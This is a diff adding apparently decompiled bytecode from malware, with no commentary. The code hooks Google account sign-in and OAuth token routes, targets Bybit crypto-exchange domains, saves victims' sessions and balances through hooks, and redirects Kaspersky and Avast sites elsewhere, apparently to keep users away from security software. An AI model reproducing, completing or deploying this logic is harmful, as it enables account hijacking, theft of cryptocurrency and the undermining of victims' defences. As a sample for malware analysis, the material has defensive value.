@@ -1,0 +1,265 @@
+function func_bootstrap_0x10000be20()
+{
+	r4 = 0
+	ACCU = func_initRouter_0x10000ba6f()
+	ACCU = func_bootstrapBalances_0x10000bdc4()
+	ACCU = func_Redirect_0x10000bdca()
+	ACCU = func_routerInit_0x10000bdd2()
+	ACCU = func_initRouter_0x10000bde1()
+	ACCU = func_googleProxy_0x10000be07()
+	ACCU = func_Router_0x10000be0e()
+	ACCU = func_bootstrap_0x10000be19()
+	r7 = global_ll["use"]
+	ACCU = r7(global_VB)
+	r7 = global_ll["use"]
+	ACCU = r7(global_Pm)
+	r7 = global_ll["use"]
+	ACCU = r7(global_YV)
+	r7 = global_ll["use"]
+	ACCU = r7(global_j5)
+	r7 = global_ll["use"]
+	ACCU = r7(global_Gm)
+	r7 = global_ll["use"]
+	ACCU = r7(global_Up)
+	r7 = global_ll["use"]
+	ACCU = r7((global_hB["router"]))
+	return undefined
+}
+function func_bootstrap_0x10000be19()
+{
+	r0 = new {"V": "L@kv", "J": 81117, "S": "A0Dr", "g": 40858, "L": "vV[N", "X": 22743}
+	r7 = func_initRouter_0x10000ba61["exports"]()
+	global_pL = func_interopProxy_0x10000317a(r7)
+	global_Up = global_pL["Router"](r0)
+	return undefined
+}
+function func_Router_0x10000be0e()
+{
+	r0 = new {"V": 51174, "J": "M2Ty", "S": 1612, "g": "%r7r", "L": 85229, "X": "]C&)"}
+	r7 = func_initRouter_0x10000ba61["exports"]()
+	global_CL = func_interopProxy_0x10000317a(r7)
+	global_Gm = global_CL["Router"](r0)
+	return undefined
+}
+function func_googleProxy_0x10000be07()
+{
+	Scope[1144][14] = func_f_0x10000bde3
+	r0 = new {"V": "mwAz", "J": 78266, "S": "pdVE", "g": 120846, "L": "XR6@", "X": 2293, "j": "x&b0", "E": 52517, "c": "F1xf", "x": 63054, "K": "93y[", "u": 70090, "A": "%r7r", "s": 11895, "b": 104743, "i": "I@Bf", "w": 85456, "f": "p[w*", "t": 25998, "P": "B@Sb", "I": 37888, "p": "vV[N", "o": 34248, "R": "*!!t", "v": 73367, "N": ")Lyh", "M": 30236, "k": "9pb7", "Q": 80377, "W": "89J2", "T": 43292, "G": 88331, "y": "VHeU", "e": 88251, "U": "mwAz", "q": 63570, "O": 54591, "C": "[Jy3", "n": 83718, "r": "F1xf", "H": 112785, "h": "gm42", "Y": 6946, "D": "F1xf", "l": 56935, "a": "b48I", "V0": 70775, "V1": "b48I", "V2": 14872, "V3": "epz[", "V6": 53860, "VV": "xQ)2", "VJ": 42710, "Vz": "JrBU", "Vd": 26783, "Vg": "YbH*", "VL": 61654, "Vc": 94237, "Vx": "9hYk", "VB": 68996, "VK": "kh^v", "Vu": 57278, "VA": "]C&)", "Vs": 93153, "Vb": "eeST", "Vw": 86232, "Vf": ")Ku4", "Vt": 77187, "VP": "[()[", "Vp": 26221, "Vo": "^Ceg", "VR": 103338, "VQ": "mwAz", "VW": 25931, "VT": "gm42", "VG": 71699, "Vy": "n@A0", "Ve": 93545, "VU": "F1xf", "Vq": 63054, "VO": "%r7r", "Vm": 60005, "VZ": 85372, "Vn": "xQ)2", "Vr": 76312, "VH": 43825, "Vh": "A5nh", "VY": 110285, "VD": 69079, "Vl": 30367, "Va": "BS4&", "J0": 32749, "J2": "eeST", "J3": 65508, "J4": "A0Dr", "J5": 102214, "J6": "8dGo", "J7": 88803, "J9": 28901, "Jd": "m[K#", "Jg": 72950, "JL": "epz[", "JX": 21036, "Jc": 35781, "Jx": "iSZ6", "JB": 91161, "Ju": 32639, "Js": ")Lyh", "Jb": 46742, "Ji": 31656, "Jw": 108613, "Jf": "h98j", "Jt": 88980, "JP": 39180, "Jp": "B@Sb", "JR": 47894, "JQ": "F1xf", "JW": 77839, "JT": "m[K#", "JG": 7227, "Jy": 24844, "JU": "%r7r", "JF": 5041, "Jq": 90154, "JO": "]1@2", "Jm": 71099, "JC": "[Jy3", "Jn": 65755, "Jr": ")Ku4", "Jh": 99571, "JY": 63136, "JD": "K&pk", "Jl": 69620, "z0": "toM2", "z1": 76438, "z2": 101491, "z3": "O9*f", "z6": 7160, "zV": "p8sI", "zJ": 80538, "zz": "vV[N", "zd": 120218, "zS": "BS4&", "zg": 88992, "zL": 36258, "zX": 75472, "zE": "M2Ty", "zc": 74771, "zx": "A5nh", "zB": 89905, "zu": "Yx9u", "zA": 14970, "zs": "nvO5", "zw": 116125, "zf": 81573, "zt": 38878, "zP": 108952, "zp": 71448, "zo": "iSZ6", "zW": 117210, "zG": "]1@2", "zy": 32910, "zU": "mwAz", "zF": 71227, "zO": "89J2", "zC": 112518, "zZ": 106244, "zn": 20048, "zr": "%]hf", "zH": 4417, "zh": "toM2", "zY": 45586, "zl": "A0Dr", "za": 63040, "d2": 20865, "d3": 72818, "d4": 58802, "d5": 119379, "d6": "%r7r", "d7": 33225, "d9": 110032, "dV": 93120, "dJ": 113406, "dz": 111653, "dd": 38491, "dg": 15793, "dL": 62875, "dX": ")Lyh", "dj": 105897, "dE": 116202}
+	ACCU = func_initTransport_0x100006702()
+	r5 = func_fetchExports_0x100006ba6["exports"]()
+	global_XK = func_interopProxy_0x10000317a(r5)
+	r5 = func_exportJwt_0x1000047e4["exports"]()
+	global_aL = func_interopProxy_0x10000317a(r5)
+	ACCU = func_urlModule_0x100005cd5()
+	r5 = func_initRouter_0x10000ba61["exports"]()
+	global_cL = func_interopProxy_0x10000317a(r5)
+	r5 = func_initTransforms_0x10000bdaf["exports"]()
+	global_sL = func_interopProxy_0x10000317a(r5)
+	ACCU = func_initCore_0x10000a949()
+	ACCU = func_noop_0x10000673e()
+	ACCU = func_noop_0x10000bde2()
+	r2 = ("https://" + ("accounts.google.com"))
+	global_mB = (r2 + ("/o/oauth2/programmatic_auth"))
+	global_j5 = global_cL["Router"](r0)
+	r2 = global_j5["get"]
+	r6 = new [0, 0]
+	r6[0] = ("/ServiceLogin")
+	r6[1] = ("/AddSession")
+	r5 = r6
+	ACCU = r2(("accounts.google.com"), r5, func_addSessionProxy_0x10000bdf7)
+	r2 = global_j5["get"]
+	r6 = new {"request": null}
+	r7 = new {"headers": null}
+	r7["headers"] = func_headers_0x10000bdf9
+	r6["request"] = r7
+	ACCU = r2(("accounts.google.com"), ("/InteractiveLogin"), r6)
+	r2 = global_j5["get"]
+	ACCU = r2(("accounts.google.com"), ("/o/oauth2/programmatic_auth"), func_createRequest_0x10000be03)
+	r2 = global_j5["get"]
+	r5 = ("/oauth2/:version/token?grant_type=authorization_code&client_id=" + ("77185425430.apps.googleusercontent.com"))
+	ACCU = r2(("www.googleapis.com"), r5, func_transformResponse_0x10000be06)
+	return undefined
+}
+function func_initRouter_0x10000bde1()
+{
+	Scope[1159][3] = func_e_0x10000bdd8
+	r0 = new {"V": 47427, "J": "%]hf", "S": 74480, "g": "%r7r", "L": 98689, "X": "JrBU", "j": 39904, "E": ")Ku4", "c": 122643, "x": "h98j", "K": 62854, "u": "%r7r", "A": 123477, "s": "A0Dr", "b": 72715, "i": ")Lyh", "w": 4855, "f": ")Ku4", "t": 11555, "P": "VHeU", "I": 53262, "p": "Yx9u", "o": 95507, "R": "x&b0", "v": 123836, "N": "A5nh", "M": 45194, "k": "O9*f", "Q": 118718, "W": 60356, "T": "M2Ty", "G": 82549, "y": "F1xf", "e": 68919, "U": "iSZ6", "q": 123379, "O": 58480, "C": "O9*f", "n": 106127, "r": "^Ceg", "H": 45783, "h": 53146, "Y": "x&b0", "D": 24352, "l": "epz[", "a": 88707, "V0": "L@kv", "V1": 56885, "V2": "h98j", "V3": 110796, "V6": "YbH*", "VV": 6662, "VJ": "VHeU", "Vz": 115677, "Vd": 87922, "Vg": "n@A0", "VL": 101269, "Vc": "b48I", "Vx": 93486, "VB": "L@kv", "VK": 41501, "Vu": "^Ceg", "VA": 21643, "Vs": 30210, "Vb": "iSZ6", "Vw": 52100}
+	r3 = 0
+	ACCU = func_initTransport_0x100006702()
+	r9 = func_initRouter_0x10000ba61["exports"]()
+	global_iL = func_interopProxy_0x10000317a(r9)
+	r9 = func_initTransforms_0x10000bdaf["exports"]()
+	global_Y2 = func_interopProxy_0x10000317a(r9)
+	ACCU = func_urlModule_0x100005cd5()
+	ACCU = func_initFaro_0x100005504()
+	r7 = new [0, 0, 0, 0, 0, 0, 0]
+	r7[0] = "bybit.com"
+	r7[1] = "bybitglobal.com"
+	r7[2] = "bytick.com"
+	r7[3] = "bybits.org"
+	r7[4] = "bybits.io"
+	r7[5] = "byhkbit.com"
+	r7[6] = "bybit-tr.com"
+	global_oL = r7
+	r6 = global_oL["map"]
+	global_A6 = r6(func_prefix_0x10000bde0)
+	global_YV = global_iL["Router"](r0)
+	return undefined
+}
+function func_routerInit_0x10000bdd2()
+{
+	r0 = new {"V": "xQ)2", "J": 51666, "S": "^Ceg", "g": 15993, "L": "eeST", "X": 1814, "j": "p8sI", "E": 34904, "c": "toM2", "x": 87880, "K": "Yx9u", "u": 1619, "A": "[()[", "s": 17345, "b": "[()[", "i": 54297, "w": "p8sI", "f": 109713, "t": "x&b0", "P": 118467}
+	r7 = func_initRouter_0x10000ba61["exports"]()
+	global_rL = func_interopProxy_0x10000317a(r7)
+	r7 = func_initTransforms_0x10000bdaf["exports"]()
+	global_TK = func_interopProxy_0x10000317a(r7)
+	global_Pm = global_rL["Router"](r0)
+	return undefined
+}
+function func_Redirect_0x10000bdca()
+{
+	Scope[1161][6] = func_n_0x10000bdc5
+	r0 = new {"V": 7389, "J": "xQ)2", "S": 58164, "g": "[()[", "L": 60415, "X": "x&b0", "j": 67851, "E": "93y[", "c": 1714, "x": "pdVE", "K": 106135, "u": "]C&)", "A": 79824, "s": "93y[", "b": 42401, "i": "A0Dr", "w": 23260, "f": "Yx9u", "t": 19827, "P": "YbH*", "I": 27008, "p": "Yx9u", "o": 15961, "R": "BS4&", "v": 19226, "N": "pdVE", "M": 82091, "k": "h98j", "Q": 66376, "W": "b48I", "T": 85814, "G": "K&pk", "y": 70290, "e": "C0qY"}
+	r9 = func_initRouter_0x10000ba61["exports"]()
+	global_uL = func_interopProxy_0x10000317a(r9)
+	r6 = new {"*kaspersky*": null, "*avast*": null}
+	r6["*kaspersky*"] = "https://www.bitdefender.com"
+	r6["*avast*"] = "https://www.avg.com"
+	global_nL = r6
+	global_VB = global_uL["Router"](r0)
+	r9 = r0["y"]
+	r10 = r0["e"]
+	r6 = Object["entries"]
+	r8 = r6(global_nL)
+	r7 = GetIterator(r8)
+	r6 = r7["next"]
+	ACCU = false
+	r8 = false
+	try
+	{
+		while (true)
+		{
+			r8 = true
+			r12 = r6()
+			if (r12["done"]) break
+			r8 = false
+			ACCU = GetIterator(r12["value"])
+			r14 = r12["value"]
+			r12 = r12["value"]
+			r16 = ACCU
+			ACCU = false
+			r17 = false
+			try
+			{
+				if (!false)
+				r17 = true
+				r21 = r16["next"]()
+				ACCU = r21["done"]
+					&& (!r21["done"])
+				{
+					r17 = false
+					ACCU = r21["value"]
+				}
+				else
+				{
+					ACCU = undefined
+				}
+				r4 = ACCU
+				if (!r17)
+				r17 = true
+				r21 = r16["next"]()
+				ACCU = r21["done"]
+					&& (!r21["done"])
+				{
+					r17 = false
+					ACCU = r21["value"]
+				}
+				else
+				{
+					ACCU = undefined
+				}
+				Scope[1162][2] = ACCU
+				ACCU = -1
+				r19 = -1
+				r18 = -1
+			}
+			catch
+			{
+				r19 = ACCU
+				r18 = 0
+			}
+			if (!r17)
+			{
+				try
+				{
+					if (!r16["return"] == undefined)
+					{
+						ACCU = r16["return"]()
+					}
+					catch {}
+				}
+			}
+			ACCU = null
+			if (r18 === 0)
+			{
+				r9 = 0
+				r10 = r19
+				break
+			}
+			r19 = new {"response": null}
+			r20 = new {"headers": null}
+			r20["headers"] = func_redirect_0x10000bdc9
+			r19["response"] = r20
+			r16 = r4
+			ACCU = global_VB["on"](r16, null, null, r19)
+		}
+		ACCU = -1
+		r10 = -1
+		r9 = -1
+	}
+	catch
+	{
+		r10 = ACCU
+		r9 = 0
+	}
+	if (!r8)
+	{
+		try
+		{
+			if (!r7["return"] == undefined)
+			{
+				ACCU = r7["return"]()
+			}
+			catch {}
+		}
+	}
+	ACCU = null
+	if (r9 === 0)
+	{
+		ACCU = r10
+	}
+	return undefined
+}
+function func_bootstrapBalances_0x10000bdc4()
+{
+	Scope[1163][8] = func_a_0x10000bdb7
+	ACCU = func_initCore_0x10000a949()
+	r5 = func_initTransforms_0x10000bdaf["exports"]()
+	global_hB = func_interopProxy_0x10000317a(r5)
+	ACCU = func_setup_0x10000bdb6()
+	ACCU = func_initFaro_0x100005504()
+	r2 = global_hB["setHooks"]
+	r3 = new {"saveBalance": null, "saveSession": null}
+	r3["saveBalance"] = func_updateBalance_0x10000bdc1
+	r3["saveSession"] = func_saveSession_0x10000bdc3
+	ACCU = r2(r3)
+	return undefined
+}
+function func_initRouter_0x10000ba6f()
+{
+	r0 = new {"V": "h^gm", "J": 88426, "S": "pdVE", "g": 111785, "L": "Yx9u", "X": 53288}
+	r7 = func_initRouter_0x10000ba61["exports"]()
+	global_eL = func_interopProxy_0x10000317a(r7)
+	global_ll = global_eL["Router"](r0)
+	return undefined
+}
